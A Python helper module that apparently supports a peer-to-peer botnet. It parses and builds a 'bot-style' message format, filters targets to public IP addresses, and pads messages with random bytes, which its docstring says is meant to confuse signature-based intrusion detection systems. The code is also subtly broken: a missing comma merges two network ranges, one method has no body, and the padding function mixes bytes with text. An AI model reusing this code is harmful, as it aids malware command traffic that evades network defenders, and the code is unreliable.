import string, random, binascii
from random import choice, randint
from struct import unpack
from socket import inet_aton
from datetime import datetime
from netaddr import IPNetwork

class utils():
    def __init__(self):
        self.networks = [
            '0.0.0.0/8',
            '10.0.0.0/8',
            '127.0.0.0/8',
            '192.0.0.0/24',
            '192.0.2.0/24',
            '192.88.99.0/24',
            '192.168.0.0/16'
            '172.16.0.0/12',
            '224.0.0.0/4',
            '240.0.0.0/4',
            '255.255.255.255/32'
        ]
    
    def strtodate(self, date):
        '''
        Converts a string into a datetime object
        '''

        return datetime.strptime(date, "%Y-%m-%d")

    def isprivate(self, ip):
        '''
        Checks if the IP belongs to private subnets
        '''
        for network in self.networks:
            try:
                ipaddr = unpack(">I", inet_aton(ip))[0]

                netaddr, bits = network.split("/")
                network_low = unpack(">I", inet_aton(netaddr))[0]
                network_high = network_low | 1 << (32 - int(bits)) - 1

                if ipaddr <= network_high and ipaddr >= network_low:
                    return True
            except Exception:
                continue

        return False

    def handle_addr(self, addr):
        '''
        Checks if the specified IP address is a bad one
        '''

        try:
            octets = addr.split('.')
            return not self.isprivate(addr) and len(octets) == 4 and all(x.isdigit() for x in octets) and all(0 <= int(x) <= 255 for x in octets)
        except:
            return False # error? bad ip

    def randomstr(self, length=0):
        '''
        Generates a random string
        '''

        return ''.join(choice(string.ascii_letters) for _ in range(length if length != 0 else randint(1,100)))
    
    def create_peer_obj(self, data: dict):
        '''
        Converts a dictionary into a bot-parsable peer object

        Format
        random junk, 4 bytes
        ip address type (04 for v4, 06 for v6), 2 bytes
        ipv4 address
        '''

    def convert(self, data: dict):
        '''
        Converts data into a bot-style format

        Format
        opcode, 2 bytes
        sessionid, 36 bytes
        sourceid, 36 bytes
        payload, all other data including padding
        '''

        opcode = data['opcode']
        session_id = data['session_id']
        source_id = data['source_id']
        body = data['body']

        if int(opcode) < 9:
            opcode = f'0{opcode}'

        return f'{opcode}{session_id}{source_id}{body}\n'.encode()
    
    def parse(self, data: str or bytes):
        '''
        Parses the raw data into a nice and easy to edit dictionary
        '''

        if type(data) == bytes:
            data = data.decode()

        data = data.rstrip()
        return {
            'opcode': int(data[:2]), # first 2 bytes is the opcode
            'session_id': data[2:][:36], # 36 bytes after opcode is the session id
            'source_id': data[38:][:36], # 38 bytes after that, we have the node source id
            'body': data[74:] # everything else is the body, including padding
        }

    def uuid(self):
        '''
        Creates a Unique User IDentifier
        '''

        return binascii.hexlify(random.getrandbits(256).to_bytes(32, 'little')).decode() # more bits = less chance of colliding but also more system resource intensive

    def pad(self, data: str or bytes):
        '''
        Pads the data with some more bytes, confuses signature-based IDS's (intrusion detection systems)
        '''

        result = data
        if type(data) != bytes:
            result = data.encode()
        
        return result + ''.join(choice(string.ascii_letters) for _ in range(randint(128, 256)))